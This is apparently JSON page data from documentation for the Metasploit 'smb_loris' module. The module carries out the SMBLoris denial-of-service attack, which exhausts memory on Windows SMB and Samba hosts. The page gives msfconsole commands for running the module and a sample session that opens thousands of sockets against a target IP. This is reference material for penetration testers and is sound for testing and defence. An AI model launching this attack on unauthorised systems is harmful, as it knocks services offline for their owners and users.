{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/dos/smb/smb_loris","result":{"data":{"moduleMetadataJson":{"id":"b7d4c3d2-89ae-5a96-afa1-b89c71178951","name":"SMBLoris NBSS Denial of Service","fullname":"auxiliary/dos/smb/smb_loris","description":"The SMBLoris attack consumes large chunks of memory in the target by sending\n    SMB requests with the NetBios Session Service(NBSS) Length Header value set\n    to the maximum possible value. By keeping these connections open and initiating\n    large numbers of these sessions, the memory does not get freed, and the server\n    grinds to a halt. This vulnerability was originally disclosed by Sean Dillon\n    and Zach Harding.\n\n    DISCALIMER: This module opens a lot of simultaneous connections. Please check\n    your system's ULIMIT to make sure it can handle it. This module will also run\n    continuously until stopped.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/dos/smb/smb_loris","documentationSlug":"/modules/documentation/auxiliary/dos/smb/smb_loris","referencesSlug":"/modules/references/auxiliary/dos/smb/smb_loris"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module exploits a vulnerability in the NetBIOS Session Service Header for SMB.\nAny Windows machine with SMB Exposed, or any Linux system running Samba are vulnerable.\nSee <a href=\"http://smbloris.com/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">the SMBLoris page</a> for details on the vulnerability.</p>\n<p>  The module opens over 64,000 connections to the target service, so please make sure\nyour system ULIMIT is set appropriately to handle it. A single host running this module\ncan theoretically consume up to 8GB of memory on the target.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/dos/smb/smb_loris</code></li>\n<li>Do: <code class=\"language-text\">set rhost [IP]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>Target should allocate increasing amounts of memory.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(smb_loris) &gt; use auxiliary/dos/smb/smb_loris\nmsf auxiliary(smb_loris) &gt; set RHOST 192.168.172.138\nRHOST =&gt; 192.168.172.138\nmsf auxiliary(smb_loris) &gt;\n\nmsf auxiliary(smb_loris) &gt; run\n\n[*] Starting server...\n[*] 192.168.172.138:445 - 100 socket(s) open\n[*] 192.168.172.138:445 - 200 socket(s) open\n...\n[!] 192.168.172.138:445 - At open socket limit with 4000 sockets open. Try increasing you system limits.\n[*] 192.168.172.138:445 - Holding steady at 4000 socket(s) open\n...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"b7d4c3d2-89ae-5a96-afa1-b89c71178951"}}}